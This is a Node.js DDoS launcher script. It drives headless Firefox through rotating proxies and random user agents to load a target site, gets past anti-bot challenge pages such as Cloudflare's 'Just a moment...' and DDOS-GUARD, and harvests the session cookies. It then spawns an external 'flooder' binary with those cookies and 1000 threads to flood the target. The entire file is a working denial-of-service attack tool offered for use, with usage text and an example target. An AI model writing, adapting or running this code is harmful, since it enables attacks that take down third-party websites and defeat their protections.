const { firefox } = require('playwright-extra');
const {spawn} = require('child_process');
require('events').EventEmitter.defaultMaxListeners = 0;
const fs = require('fs');

if (process.argv.length < 5) {
    console.log('URL Time Threads');
    console.log('https://sheesh.rip/ 120 5');
    process.exit(0);
}
const target = process.argv[2], time = process.argv[3], thread = process.argv[4];
process.on('uncaughtException', function (err) {
console.log(err)
});
proxies = fs.readFileSync('http.txt', 'utf-8').toString().replace(/\r/g, '').split('\n').filter(word => word.trim().length > 0);
addua = fs.readFileSync('ua.txt', 'utf-8').toString().replace(/\r/g, '').split('\n')
        

function control(proxer) {
uas = addua[Math.floor(Math.random() * addua.length)]
firefox.launch({ headless: true ,proxy: {server: proxer},timeout: 10000
,args: [
                  '--no-sandbox',
                  '--disable-setuid-sandbox',
                  '--disable-dev-shm-usage',
                  '--disable-accelerated-2d-canvas',
                  '--no-first-run',
                  '--no-zygote',
                  '--disable-gpu'
        ]}).then(async browser => {
  const context = await browser.newContext({timeout: 10000,userAgent:uas.toString()})
  const page = await context.newPage()
  await page.setViewportSize({width: 1920, height: 1080});
  const getUA = await page.evaluate(() => navigator.userAgent);
  console.log('Starting! Proxy: '+proxer + ' | UserAgent: '+getUA);
  try {
  await page.goto(target, { waitUntil: 'networkidle' })
  } catch (error1) {
  await browser.close();
  restart()
  }
  try {
  await page.waitForTimeout(5000);
  const title = await page.title();
  if (title == "Just a moment...") {
  await browser.close();
  }
  if (title == "Checking your browser...") {
  await browser.close();
  }
  if (title == "DDOS-GUARD") {
  await browser.close();
  }
  const cookie = await context.cookies()
  let goodcookie = "";
  let laa_ = JSON.stringify(cookie);
  laa_ = JSON.parse(laa_);
  laa_.forEach((value) => {
  const valueString = value.name + "=" + value.value + "; ";
  goodcookie += valueString;
  });
  goodcookie = goodcookie.slice(0, -2);
  console.log('Solved! Proxy: '+proxer + ' | UserAgent: '+getUA + ' | Cookie: '+goodcookie); 
  await browser.close()
  let promise = new Promise((res, rej) => {
const command = spawn('./flooder', ["host=" + target, "limit=5", "time=" + time, "good=" + proxer, "ua=" + getUA, "threads=1000", "cookie=" + goodcookie]);
 })
} catch (error2) {
await browser.close();
restart()
}
})
}
function start() {
for (let i = 0; i < thread; i++) {
  proxer = proxies[Math.floor(Math.random() * proxies.length)]
  control(proxer);
}
}

function restart() {
proxer = proxies[Math.floor(Math.random() * proxies.length)]
control(proxer);
}
start()